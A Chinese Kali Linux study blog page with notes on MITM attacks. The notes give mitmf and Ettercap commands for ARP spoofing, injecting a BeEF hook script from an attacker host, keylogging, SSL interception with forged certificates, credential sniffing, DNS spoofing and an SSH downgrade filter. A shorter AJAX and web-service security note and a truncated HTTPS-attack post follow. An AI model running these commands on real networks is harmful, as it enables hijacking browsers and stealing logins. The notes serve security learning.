<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Tomas&#39;Blog">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;page&#x2F;4&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/4/"/>





  <title>Tomas'Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Tomas'Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AB)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E6%B3%A8%E5%85%A5XSS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E5%85%AB)%EF%BC%9ASSL%E3%80%81TLS%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB--%E6%B3%A8%E5%85%A5XSS/" itemprop="url">Kali Linux笔记(五十八)：SSL、TLS中间人攻击--注入XSS</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-24T15:08:48+08:00">
                2020-01-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.8k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  8 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-中间人攻击（注入XSS）"><a href="#1-中间人攻击（注入XSS）" class="headerlink" title="1. 中间人攻击（注入XSS）"></a>1. 中间人攻击（注入XSS）</h4><ul>
<li>注入XSS<ul>
<li>结合ARP欺骗或DNS代理欺骗，实现中间人攻击</li>
<li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码 </li>
<li>一旦得手，影响范围巨大 </li>
<li>如果中间人发生在运营商线路上，很难引起用户注意，隐蔽性高 </li>
</ul>
</li>
</ul>
<h4 id="2-中间人攻击–Mitmf-Beef"><a href="#2-中间人攻击–Mitmf-Beef" class="headerlink" title="2. 中间人攻击–Mitmf*Beef"></a>2. 中间人攻击–Mitmf*Beef</h4><ul>
<li>Mitmf 安装（无核心技术内容，冗杂性大）▲ 2020.1.24一些依赖包以及安装包无法找到<ul>
<li>曾经号称最好用的中间人攻击工具（kali 2.0后默认未安装） </li>
<li><strong><code>🔺命令：apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</code></strong> </li>
<li><strong><code>🔺命令：apt-get install mitmf</code></strong> </li>
<li><strong><code>🔺命令：pip uninstall twisted</code></strong> </li>
<li><strong><code>🔺命令：wget http://twistedmatrix.com/Releases/Twisted/15.5/Twisted15.5.0.tar.bz2</code></strong> </li>
<li><strong><code>🔺命令：pip install ./Twisted-15.5.0.tar.bz2</code></strong></li>
</ul>
</li>
<li>启动beef <ul>
<li><strong><code>🔺命令：cd /usr/share/beef-xss/</code></strong> </li>
<li><strong><code>🔺命令：./beef</code></strong> ▲ 2020.1.24修改为beef-xss（命令存在Bash中）</li>
</ul>
</li>
<li>mitmf中间人注入xss脚本（结合Beef）<ul>
<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 1.1.1.1（正确网关地址） --target 1.1.1.2 --inject --js-url http://1.1.1.3:3000/hook.js</code></strong> （ARP地址欺骗）</li>
</ul>
</li>
<li>mitmf中间人注入xss脚本（不结合Beef） <ul>
<li><strong><code>🔺命令：mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</code></strong>（ARP地址欺骗）</li>
<li>–upsidedownternet（图片倒转）、–screen（/var/log/mitmf，屏幕快照） </li>
<li>–ferretng（抓取cookie）、–browserprofiler（浏览器及插件信息） </li>
<li>–smbtrap（抓取smb）、–smbauth（smb认证）</li>
<li>–hsts（新的安全协议）<ul>
<li>HTTP Strict Transport Security </li>
<li>防止协议降级、cookie窃取 </li>
<li>安全策略通过HTTP响应头”Strict-Transport-Security”实施 </li>
<li>限制user-agent、https等</li>
</ul>
</li>
<li>–filepwn（EXE执行程序的下载，插入后门程序）<ul>
<li>凌空插后门 </li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-中间人攻击–Ettercap"><a href="#3-中间人攻击–Ettercap" class="headerlink" title="3. 中间人攻击–Ettercap"></a>3. 中间人攻击–Ettercap</h4><ul>
<li>Ettercap ▲ 2020.1.24Ettercap有点小问题，关于主机发现这一模块<ul>
<li>统一的中间人攻击工具 </li>
<li>转发MAC与本机相同，但IP与本机不同的数据包 </li>
<li>支持SSH1、SSL中间人攻击</li>
</ul>
</li>
<li>模块划分 <ul>
<li>Snifer </li>
<li>MITM </li>
<li>Filter </li>
<li>Log </li>
<li>Plugin</li>
</ul>
</li>
</ul>
<h4 id="4-Ettercap–Snifer"><a href="#4-Ettercap–Snifer" class="headerlink" title="4. Ettercap–Snifer"></a>4. Ettercap–Snifer</h4><ul>
<li>Snifer<ul>
<li>负责数据包转发</li>
<li>Unified<ul>
<li>单网卡情况下独立完成三层包转发</li>
<li>始终禁用内核IP_Forward功能</li>
</ul>
</li>
<li>Bridge <ul>
<li>双网卡情况下的一层MITM模式</li>
<li>可作为IPS过滤数据包</li>
<li>不可在网关上使用（透明网桥）</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="5-Ettercap–MITM"><a href="#5-Ettercap–MITM" class="headerlink" title="5. Ettercap–MITM"></a>5. Ettercap–MITM</h4><ul>
<li>MITM <ul>
<li>把流量重定向到ettercap主机上 </li>
<li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li>
</ul>
</li>
<li>实现MITM的方法 <ul>
<li>ARP（一般为动态类型的ARP表）</li>
<li>ICMP <ul>
<li>ICMP路由重定向，半双工，回包不经过Kali（去包回包都经过Kali为全双工）</li>
<li>-M icmp:00:11:22:33:44:55/10.0.0.1（真实网关的MAC/IP）</li>
</ul>
</li>
<li>DHCP <ul>
<li>修改网关地址，半双工，回包不经过Kali</li>
<li>DHCP发包过程Discover、Offer、Resquest、ACK</li>
<li>−M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1（DNS）</li>
</ul>
</li>
<li>Switch Port Stealing（交换机端口窃取）<ul>
<li>交换机根据源MAC地址更新</li>
<li>flood目标地址是本机，源地址是受害者的包（向交换机发送大量泛洪攻击）</li>
<li>适用于ARP静态绑定的环境（arp -s → 添加静态绑定的ARP）</li>
<li>-M port /1.1.1.1/ /1.1.1.2/ </li>
</ul>
</li>
<li>NDP <ul>
<li>IPv6协议欺骗技术</li>
<li>-M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</li>
</ul>
</li>
</ul>
</li>
<li>Linux2.4以上内核对ARP地址欺骗的约束 <ul>
<li>收到非请求的ARP响应包，不更新本地ARP缓存 </li>
<li>Ettercap使用ARP request包进行攻击 </li>
</ul>
</li>
<li>Solaris不根据ARP包更新本地ARP缓存 <ul>
<li>Ettercap使用先发ICMP包来更新ARP缓存</li>
</ul>
</li>
</ul>
<h4 id="6-Ettercap–准备"><a href="#6-Ettercap–准备" class="headerlink" title="6. Ettercap–准备"></a>6. Ettercap–准备</h4><ul>
<li>用户操作界面 <ul>
<li>-T 文本界面（文本字符）</li>
<li>-G 图形界面 </li>
<li>-C 基于文本的图形界面（文本类似图形化）</li>
<li>-D 后台模式 </li>
</ul>
</li>
<li>指定目标 <ul>
<li>IPv4：MAC/IPv4/Ports </li>
<li>IPv6：MAC/IPv4/IPv6/Ports </li>
<li>/10.0.0.1−5;10.0.1.33/20−25,80,110</li>
</ul>
</li>
<li>权限 <ul>
<li>主配置文件：/etc/ettercap/etter.conf</li>
<li>需要root权限打开链路层Socket连接，然后使用nobody账号运行 </li>
<li>日志写入目录需要nobody有写入权 </li>
<li>修改etter.conf：EC_UID=65534/EC_GID=65534 → EC_UID=0/EC_GID=0</li>
</ul>
</li>
<li>基于伪造证书的SSL MITIM <ul>
<li>Bridge模式不支持SSL MITM ▲ 2020.1.24报额外参数的错误</li>
<li><strong><code>🔺命令：openssl genrsa −out etter.ssl.crt 1024</code></strong> </li>
<li><strong><code>🔺命令：openssl req −new−keyetter.ssl.crt −out tmp.csr</code></strong> </li>
<li><strong><code>🔺命令：openssl x509 −req −days 1825 −in tmp.csr −signkey etter.ssl.crt −out tmp.new</code></strong> </li>
<li><strong><code>🔺命令：cat tmp.new&gt;&gt;etter.ssl.crt</code></strong></li>
<li><strong><code>🔺命令：rm −f tmp.newtmp.csr</code></strong></li>
</ul>
</li>
</ul>
<h4 id="7-Ettercap–字符模式"><a href="#7-Ettercap–字符模式" class="headerlink" title="7. Ettercap–字符模式"></a>7. Ettercap–字符模式</h4><ul>
<li>参数<ul>
<li>-M（MITM技术）</li>
<li>-F（过滤器）</li>
<li>-P（模块）</li>
<li>-w（网络流量记录）</li>
<li>-l（简单记录日志）</li>
<li>-L（记录所有日志信息）</li>
<li>-m（账号密码信息）</li>
<li>-q（安静模式/有用的信息）</li>
</ul>
</li>
<li>MITM攻击<ul>
<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</code></strong></li>
<li>找一个FTP服务器</li>
<li>输入账号/密码</li>
<li>查看ettercap字符界面</li>
</ul>
</li>
<li>Ettercap 日志查看 ▲ 2020.1.24查看无权限<ul>
<li><strong><code>🔺命令：cat message</code></strong>（root目录下）</li>
<li><strong><code>🔺命令：ls log发现文件是加密信息</code></strong></li>
<li><strong><code>🔺命令：etterlog -p log.eci 查看获取的密码</code></strong></li>
<li><strong><code>🔺命令：etterlog -c log.ecp 列出Log中的连接</code></strong></li>
<li><strong><code>🔺命令：etterlog -c -f //1.1.1.1/ log.ecp</code></strong></li>
<li><strong><code>🔺命令：etterlog -B -n -s -F TCP:1.1.1.1:20;1.1.1.2:1234 log.ecp &gt; aa 选择相应的连接并榨取文件</code></strong></li>
</ul>
</li>
</ul>
<h4 id="8-Ettercap–图形界面"><a href="#8-Ettercap–图形界面" class="headerlink" title="8. Ettercap–图形界面"></a>8. Ettercap–图形界面</h4><ul>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个FTP服务器</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
<h4 id="9-Ettercap–SSL中间人攻击"><a href="#9-Ettercap–SSL中间人攻击" class="headerlink" title="9. Ettercap–SSL中间人攻击"></a>9. Ettercap–SSL中间人攻击</h4><ul>
<li>SSL MITM（默认无开启，需要在配置文件中修改，图形界面）<ul>
<li><strong><code>🔺命令：vi /etc/ettercap/etter.conf</code></strong>（Linux → The second iptables）</li>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个有SSL页面</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
</li>
</ul>
<h4 id="10-Ettercap–DNS欺骗"><a href="#10-Ettercap–DNS欺骗" class="headerlink" title="10. Ettercap–DNS欺骗"></a>10. Ettercap–DNS欺骗</h4><ul>
<li>DNS欺骗（图形界面） <ul>
<li>dns_spoof插件配置文件 </li>
<li><strong><code>🔺命令：vi /etc/ettercap/etter.dns</code></strong>（修改欺骗的域名对应的IP地址）</li>
<li>Plugins → Load a plugins → Load ec_dns_spoof.so</li>
<li>Plugins → Manage the plugins → 双击dns_spoof启动</li>
<li>Sniff → Unified/Bridge sniffing → 网卡</li>
<li>Host → Scan for hosts（主机扫描，会生成一个主机列表）</li>
<li>选择目标 → Add to target1 / 选择目标 → Add to target2</li>
<li>Mitm → ARP → Sniff remote connections（ARP双向中间人，Single为半双工）</li>
<li>Start → Start sniffing</li>
<li>找一个有SSL页面</li>
<li>输入账号/密码</li>
<li>查看ettercap图形界面</li>
</ul>
</li>
<li>DNS欺骗（字符界面）<ul>
<li><strong><code>🔺命令：ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -P dns_spoof</code></strong></li>
<li><strong><code>🔺命令：ipconfig /flushdns</code></strong></li>
<li><strong><code>🔺命令：ping 欺骗的域名</code></strong></li>
</ul>
</li>
</ul>
<h4 id="11-Ettercap–Filter"><a href="#11-Ettercap–Filter" class="headerlink" title="11. Ettercap–Filter"></a>11. Ettercap–Filter</h4><ul>
<li>Filter <ul>
<li>/usr/share/ettercap/</li>
<li>▲ SSH-2.xx / SSH-1.99（既支持SSH-1，也支持SSH-2） / SSH-1.51</li>
<li>etter.filter.ssh（ssh过滤文件，把SSH-2.xx/SSH-1.99转变为SSH-1.51）</li>
<li><strong><code>🔺命令：etterfilter etter.filter.ssh -o ssh.ef</code></strong></li>
<li><strong><code>🔺命令：mv ssh.ef /root</code></strong></li>
<li>直接调用 -F ssh.ef（若发送SSH-1.99，则降级SSH-1.99为SSH-1.51）</li>
</ul>
</li>
<li>替换HTTP内容（图片的内容可以替换为一个EXE或者脚本文件）</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (ip.proto == TCP &amp;&amp; tcp.src == 80) &#123; </span><br><span class="line">     msg(&quot;data on TCP 80\n&quot;); </span><br><span class="line">         replace(&quot;img src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG src=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); replace(&quot;IMG SRC=&quot;, &quot;img src=\&quot;http://1.1.1.1/1.gif\&quot; &quot;); </span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%83)%EF%BC%9AAJAX%E3%80%81Web%20Server/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/24/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%83)%EF%BC%9AAJAX%E3%80%81Web%20Server/" itemprop="url">Kali Linux笔记(五十七)：AJAX、Web Server</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-24T08:34:39+08:00">
                2020-01-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  871 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-AJAX"><a href="#1-AJAX" class="headerlink" title="1. AJAX"></a>1. AJAX</h4><ul>
<li>Asynchronous JavaScript and XML</li>
<li>是一个概念，而非一种新的编程语言，是一组现有技术的组合</li>
<li>通过客户端脚本动态更新页面部分内容，而非整个页面</li>
<li>降低带宽使用，提高速度</li>
<li>提升用户体验</li>
<li>后台异步访问</li>
</ul>
<h4 id="2-AJAX、DHTML、DOM"><a href="#2-AJAX、DHTML、DOM" class="headerlink" title="2. AJAX、DHTML、DOM"></a>2. AJAX、DHTML、DOM</h4><ul>
<li>AJAX组件<ul>
<li>JavaScript：ajax的核心组件，使用XMLHTTPRequest对象接口向服务器发起请求，接收并处理服务器响应数据</li>
</ul>
</li>
<li>Dynamic HTML（DHTML）<ul>
<li>早于AJAX出现，通过javascript、CSS等在客户端修改HTML页面element，缺点是完全依赖客户端代码修改页面，与服务器的交互由javascript applets完成，AJAX的XHR弥补了他的缺点（注册用户）</li>
</ul>
</li>
<li>Document Object Model（DOM）<ul>
<li>处理html、xml文档对象的框架，DHTML是一个浏览器，DOM作为其一个实现的接口，定义和管理每个页面元素obj的Properties、method、event</li>
</ul>
</li>
</ul>
<h4 id="3-基于AJAX的WEB应用工作流程"><a href="#3-基于AJAX的WEB应用工作流程" class="headerlink" title="3. 基于AJAX的WEB应用工作流程"></a>3. 基于AJAX的WEB应用工作流程</h4><ul>
<li>XMLHTTPRequest API创建对象xmlhttp进行访问</li>
<li>Xml、json（默认首选）、html、文本、图片</li>
<li>多个异步请求独立通信，互不依赖</li>
<li>AJAX框架<ul>
<li>JQuery</li>
<li>Dojo Toolkit</li>
<li>Google web toolkit（GWT）</li>
<li>Microsoft AJAX library</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐请求过程：User Interface →(JavaScript)→ AJAX Engine →(HTTP Request)→ Web Server → Database,backend server
⭐响应过程：Databse,backend server → Web Server →(HTML\JSON\XML)→ AJAX Engine →(DHTML)→ User Interface</code></pre></blockquote>
<h4 id="4-AJAX的安全问题"><a href="#4-AJAX的安全问题" class="headerlink" title="4. AJAX的安全问题"></a>4. AJAX的安全问题</h4><ul>
<li>目前没有通用的AJAX安全最佳实践，其攻击面不为大多数人所知</li>
<li>AJAX的安全问题<ul>
<li>多种技术混合，增加了攻击面，每个参数都可能形成独立的攻击过程</li>
<li>AJAX引擎是个全功能的脚本解释器，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP（同源策略），但可能绕过</li>
<li>服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露、</li>
<li>暴漏应用程序逻辑</li>
</ul>
</li>
<li>AJAX对渗透测试的挑战<ul>
<li>异步请求数量多且隐蔽</li>
<li>触发AJAX请求的条件无规律</li>
<li>手动和截断代理爬网可能产生大量遗漏</li>
</ul>
</li>
<li>AJAX爬网工具<ul>
<li>ZAP（Sites → 右键 → Attack → AJAX Spider）</li>
</ul>
</li>
<li>客户端代码审计<ul>
<li>源码</li>
<li>Firebug</li>
</ul>
</li>
</ul>
<h4 id="5-Web-Service（F12）"><a href="#5-Web-Service（F12）" class="headerlink" title="5. Web Service（F12）"></a>5. Web Service（F12）</h4><ul>
<li>Web Service<ul>
<li>面向服务的架构（service oriented architecture）便于不同系统集成共享数据和功能</li>
<li>尤其适合不想要暴漏数据模型和程序逻辑而访问数据的场景</li>
<li>无页面（最典型的类型）</li>
</ul>
</li>
<li>两种类型的Web Service<ul>
<li>Simple object access protocol（SOAP）<ul>
<li>传统的Web Service开发方法，xml是唯一的数据交换格式</li>
<li>要求安全性的应用更多采用</li>
</ul>
</li>
<li>RESTful（Representational Transfer architecture–REST）<ul>
<li>目前更多被采用的轻量的web service，JSON是首选数据交换格式</li>
</ul>
</li>
</ul>
</li>
<li>Web Service安全考虑<ul>
<li>使用API Key或session token实现和跟踪身份认证</li>
<li>身份认证由服务器完成，而非客户端</li>
<li>API Key、用户名、Session token永远不要通过URL发送</li>
<li>RESTful默认不提供任何安全机制，需要使用SSL/TLS保护传输数据安全</li>
<li>SOAP提供强于HTTPS的WS-security机制（传输层实现）</li>
<li>使用OAuth或HMAC进行身份验证，HMAC身份认证使用C/S共享的密钥加密API KEY</li>
<li>RESTful应只允许身份认证用户使用PUT、DELETE方法</li>
<li>使用随机token防止CSRF攻击</li>
<li>对用户提交参数过滤，建议布署基于严格白名单的方法</li>
<li>报错信息消毒</li>
<li>直接对象引用应严格身份验证（电商公司以ID作为主索引）</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%94)%EF%BC%9AHttps%E6%94%BB%E5%87%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/01/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%BA%94)%EF%BC%9AHttps%E6%94%BB%E5%87%BB/" itemprop="url">Kali Linux笔记(五十五)：Https攻击</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-22T23:54:59+08:00">
                2020-01-22
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.2k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-HTTPS攻击"><a href="#1-HTTPS攻击" class="headerlink" title="1. HTTPS攻击"></a>1. HTTPS攻击</h4><ul>
<li>全站HTTPS正成为潮流趋势<ul>
<li>淘宝、百度</li>
</ul>
</li>
<li>HTTPS的作用<ul>
<li>CIA</li>
<li>解决的是信息传输过程中数据被篡改、窃取</li>
<li>加密：对称、非对称、单向(hash计算)</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐CIA
C：机密性（Confidentiality）指只有授权用户可以获取信息。
I：完整性（Integrity）指信息在输入和传输的过程中，不被非法授权修改和破坏，保证数据的一致性。
A：可用性（Availability）指保证合法用户对信息和资源的使用不会被不正当地拒绝。</code></pre></blockquote>
<ul>
<li>HTTPS攻击方法<ul>
<li>降级攻击（高强度加密算法的降级攻击）</li>
<li>解密攻击（明文、证书伪造）</li>
<li>协议漏洞、实现方法的漏洞、配置不严格</li>
</ul>
</li>
</ul>
<h4 id="2-Secure-socket-layer"><a href="#2-Secure-socket-layer" class="headerlink" title="2. Secure socket layer"></a>2. Secure socket layer</h4><ul>
<li>保证网络通信安全的加密协议</li>
